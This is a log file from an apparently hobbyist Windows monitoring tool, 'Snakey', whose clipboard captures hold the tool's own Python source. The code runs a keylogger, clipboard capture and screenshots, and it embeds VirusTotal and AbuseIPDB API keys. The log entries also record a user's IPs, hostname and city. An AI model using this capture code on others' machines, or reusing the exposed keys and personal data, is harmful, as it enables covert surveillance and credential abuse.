  if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "cedbd2e9a09370309e512fd3cc0061f47e907518203b00d94160b9c3e49281e5", "screenshot_hash": "6af3363e0fb976343f4c29d956f5f5e3f2a2426ce85fc438d918a5b1523c1330", "log_hash": "932c9f3253cccca3d7b1d2624839e7a59384da6abb56ad1f2c9fdf9e4146a2d8"}
{"timestamp": "2025-05-22T18:56:24.550009", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(base_path, \"malware_rules.yar\")\r\nyara_scan_dirs = [\"C:/Windows\", \"C:/Program Files\", \"C:/Program Files (x86)\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "cedbd2e9a09370309e512fd3cc0061f47e907518203b00d94160b9c3e49281e5", "screenshot_hash": "6873842581fce330ca08e29a31cf9f5f84c86247d57375d0a989a71f44f78103", "log_hash": "0792ed259311ca73fd91b33a01cdf76cbbde94a7044a974f2c5e181036a7975b"}
{"timestamp": "2025-05-22T18:59:05.574094", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "\"malware_index.yar\"", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "bd3f009607ed9c8de9e4648e2ded3f5fc38d6fdb625522f6c04e6690e1baf448", "screenshot_hash": "2d7c52575a2bff5ae5b2cbbbef2a5d1d3b670256c1359c8b2dde230bd2ae104c", "log_hash": "13c42f55bf35f673086e4c4e97448668019c3e21e47b8408b01ae17e557dce0b"}
{"timestamp": "2025-05-22T18:59:32.032400", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "\"malware_index.yar\"", "keystrokes": "\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "bd3f009607ed9c8de9e4648e2ded3f5fc38d6fdb625522f6c04e6690e1baf448", "screenshot_hash": "f70942889930a14c69adc1dd1dd67c0d32c868983ead1e101ec13ec3057c5d15", "log_hash": "7e0f8056842214a9709a55983792330ad841e44e0891732e086dea1160264da1"}
{"timestamp": "2025-05-22T19:01:42.091440", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:63e1:b252:3e9:9478", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "def scan_with_yara():\r\n    findings = []\r\n    try:\r\n        current_dir = os.getcwd()\r\n        os.chdir(base_path)  # Change to the directory where malware_index.yar and malware/ folder exist\r\n\r\n        rules = yara.compile(filepath=\"malware_index.yar\")\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n\r\n        os.chdir(current_dir)  # Restore original working directory\r\n\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "d0c3fc2ddc4c057da744239d6a9302a22e91fd31e24cc3ed1a07107c48a75f29", "screenshot_hash": "ffb42cc8723df97306a7fc9399cdbf80cad8ce125183c0943c2f87368d5bc1a3", "log_hash": "3190c07522ff810c8c21578d83e8e68c397bb2f7b564925e9c8491bb3811cb90"}
{"timestamp": "2025-05-22T19:02:08.932334", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:63e1:b252:3e9:9478", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "def scan_with_yara():\r\n    findings = []\r\n    try:\r\n        current_dir = os.getcwd()\r\n        os.chdir(base_path)  # Change to the directory where malware_index.yar and malware/ folder exist\r\n\r\n        rules = yara.compile(filepath=\"malware_index.yar\")\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n\r\n        os.chdir(current_dir)  # Restore original working directory\r\n\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": 